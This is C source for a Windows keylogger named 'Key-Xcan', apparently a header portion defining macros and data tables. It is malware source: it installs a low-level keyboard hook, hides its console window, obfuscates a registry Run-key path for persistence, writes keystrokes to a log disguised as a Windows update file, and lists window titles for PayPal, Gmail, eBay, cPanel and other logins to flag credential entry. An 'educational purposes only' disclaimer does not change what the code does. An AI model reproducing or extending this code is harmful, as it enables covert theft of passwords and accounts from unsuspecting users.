/*
Key-Xcan
Writen By NoobieDog
Last Updated ~ 2008  

FOR EDUCATIONAL PURPOSES ONLY!!!

ADD ME ON TWITTER @NOOBIEDOG

This software is released under the terms of the  GNU General Public License (GPLv3).
*/

#define GWD(x,o) GetWindowsDirectory(x,o);
#define SW(x,o) ShowWindow(x,o);
#define ST stealth
#define FWA FindWindowA("ConsoleWindowClass",NULL);
#define ROK (RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPT("QlbqqfzlVFen|`c~tgHBy|vmh@^kmRDLWr@TTAFDw~X@"),0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
#define RSV RegSetValueEx(hKey,CPT("ujjmjw"),0, REG_SZ, (const unsigned char*)winDir, strlen(winDir)); //EXEN -3 ".exe"
#define KL "%s\\Keylog-KB942968.log"
#define SWH SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, hInstance , 0);
#define KH LRESULT CALLBACK KeyboardHook (int nCode, WPARAM wParam, LPARAM lParam )
#define KD WM_KEYDOWN
#define CNH CallNextHookEx(NULL,nCode,wParam,lParam)
#define CK  1  //crypt
#define MCL strncpy(szLastTitle, szCurTitle, 1024); // make current last

HHOOK hHook;
LRESULT CALLBACK KeyboardHook (int nCode, WPARAM wParam, LPARAM lParam );
FILE* logFile = NULL;

typedef struct LOGCHAR
{
    unsigned char pCode;
    char* upper, *lower;
};

typedef struct TITLE
{
    char* gtitle, *dtitle;
};

TITLE titleName[] =
    {
        {"Login", "LOGIN DETECTED"},
        {"login", "LOGIN DETECTED"},
        {"Google Mail", "GMAIL DETECTED"},
        {"Login - PayPal", "PAYPAL DETECTED"},
        {"World of Warcraft", "WOW DETECTED"},
        {"RapidShare", "RAPIDSHARE DETECTED"},
        {"Sign In", "HOTMAIL DETECTED"},
        {"Sign in to Yahoo!", "YAHOO DETECTED"},
        {"PlayNC Master Account", "PLAYNC DETECTED"},
        {"moneybookers.com", "MONEYBOOKERS DETECTED"},
        {"cPanel", "CPANEL DETECTED"},
        {"MySpace", "MYSPACE DETECTED"},
        {"Welcome to Facebook!", "MYSPACE DETECTED"},
        {"Welcome to eBay", "EBAY DETECTED"},
    };


LOGCHAR keyNames[] =
    {
        //Alphabet
        {48, ")", "0"},
        {49, "!", "1"},
        {50, "@", "2"},
        {51, "#", "3"},
        {52, "$", "4"},
        {53, "%", "5"},
        {54, "^", "6"},
        {55, "&", "7"},
        {56, "*", "8"},
        {57, "(", "9"},
        {65, "A", "a"},
        {66, "B", "b"},
        {67, "C", "c"},
        {68, "D", "d"},
        {69, "E", "e"},
        {70, "F", "f"},
        {71, "G", "g"},
        {72, "H", "h"},
        {73, "I", "i"},
        {74, "J", "j"},
        {75, "K", "k"},
        {76, "L", "l"},
        {77, "M", "m"},
        {78, "N", "n"},
        {79, "O", "o"},
        {80, "P", "p"},
        {81, "Q", "q"},
        {82, "R", "r"},
        {83, "S", "s"},
        {84, "T", "t"},
        {85, "U", "u"},
        {86, "V", "v"},
        {87, "W", "w"},
        {88, "X", "x"},
        {89, "Y", "y"},
        {90, "Z", "z"},
        //Symbols
        {32, " ", " "},
        {219, "{", "["},
        {221, "}", "]"},
        {220, "|", "\\"},
        {186, ":", ";"},
        {222, "\"", "'"},
        {188, "<", ","},
        {190, ">", "."},
        {191, "?", "/"},
        {189, "_", "-"},
        {187, "+", "="},
        {192, "~", "`"},
        //numpad
        {96, "0", "0"},
        {97, "1", "1"},
        {98, "2", "2"},
        {99, "3", "3"},
        {100, "4", "4"},
        {101, "5", "5"},
        {102, "6", "6"},
        {103, "7", "7"},
        {104, "8", "8"},
        {105, "9", "9"},
        {111, "/", "/"},
        {106, "*", "*"},
        {109, "-", "-"},
        {107, "+", "+"},
        {110, ".", "."},

        //Special keys
        {27, "[ESC]", "[ESC]"},
        {13, "[ENTER]\r\n", "[ENTER]\r\n"},
        {112, "[F1]", "[F1]"},
        {113, "[F2]", "[F2]"},
        {114, "[F3]", "[F3]"},
        {115, "[F4]", "[F4]"},
        {116, "[F5]", "[F5]"},
        {117, "[F6]", "[F6]"},
        {118, "[F7]", "[F7]"},
        {119, "[F8]", "[F8]"},
        {120, "[F9]", "[F9]"},
        {121, "[F10]", "[F10]"},
        {122, "[F11]", "[F11]"},
        {123, "[F12]", "[F12]"},
        {8, "[BKSPC]", "[BKSPC]"},
        {9, "[TAB]", "[TAB]"},
        {17, "[CTRL]", "[CTRL]"},
        {91, "[WIN]", "[WIN]"},
        {92, "[WIN]", "[WIN]"},
        {44, "[PRSC]", "[PRSC]"},
        {145, "[SCLK]", "[SCLK]"},
        {45, "[INS]", "[INS]"},
        {36, "[HOME]", "[HOME]"},
        {33, "[PGUP]", "[PGUP]"},
        {46, "[DEL]", "[DEL]"},
        {35, "[END]", "[END]"},
        {34, "[PGDN]", "[PGDN]"},
        {37, "[LEFT]", "[LEFT]"},
        {38, "[UP]", "[UP]"},
        {39, "[RGHT]", "[RGHT]"},
        {40, "[DOWN]", "[DOWN]"},
        {144, "[NMLK]", "[NMLK]"},

    };
